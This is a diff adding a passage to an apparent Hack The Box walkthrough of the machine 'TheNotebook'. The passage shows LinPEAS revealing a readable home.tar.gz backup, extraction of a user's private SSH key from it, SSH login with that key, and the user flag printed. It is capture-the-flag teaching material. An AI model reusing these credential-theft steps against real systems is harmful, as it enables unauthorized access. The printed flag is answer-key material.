@@ -532,9 +532,67 @@ cdrom  home  lib             media       proc  sbin  sys   var
 
 We need to find way to privilege escalation, so run [LinPEAS Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).
 
+And in the report we find interesting archive *home.tar.gz* in */var/backups*
 
+```
+[+] Backup folders
+drwxr-xr-x 2 root root 4096 Mar 18 03:24 /var/backups                                                             
+total 52                                                                                                          
+-rw-r--r-- 1 root root 33252 Feb 24 08:53 apt.extended_states.0                                                   
+-rw-r--r-- 1 root root  3609 Feb 23 08:58 apt.extended_states.1.gz                                                
+-rw-r--r-- 1 root root  3621 Feb 12 06:52 apt.extended_states.2.gz                                                
+-rw-r--r-- 1 root root  4373 Feb 17 09:02 home.tar.gz 
+```
+
+Dowload and unzip it.
+
+```
+┌──(root💀kali)-[/home/kali/HTB/TheNotebook]
+└─# tar -xvzf home.tar.gz
+home/
+home/noah/
+home/noah/.bash_logout
+home/noah/.cache/
+home/noah/.cache/motd.legal-displayed
+home/noah/.gnupg/
+home/noah/.gnupg/private-keys-v1.d/
+home/noah/.bashrc
+home/noah/.profile
+home/noah/.ssh/
+home/noah/.ssh/id_rsa
+home/noah/.ssh/authorized_keys
+home/noah/.ssh/id_rsa.pub
+```
+
+And we get id_rsa. Use ssh connection and ger **user.txt**
+
+```
+┌──(root💀kali)-[/home/kali/HTB/TheNotebook]
+└─# ssh -i home/noah/.ssh/id_rsa noah@thenotebook.htb
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-135-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+ System information disabled due to load higher than 2.0
+
+
+61 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Thu Mar 18 05:05:34 2021 from 10.10.14.166
+noah@thenotebook:~$ ls
+user.txt
+noah@thenotebook:~$ cat user.txt 
+f718987c00ff7b8d1bd826e1f881625e
+```
 
 # Privilege Escalation#2
+
 
 
 
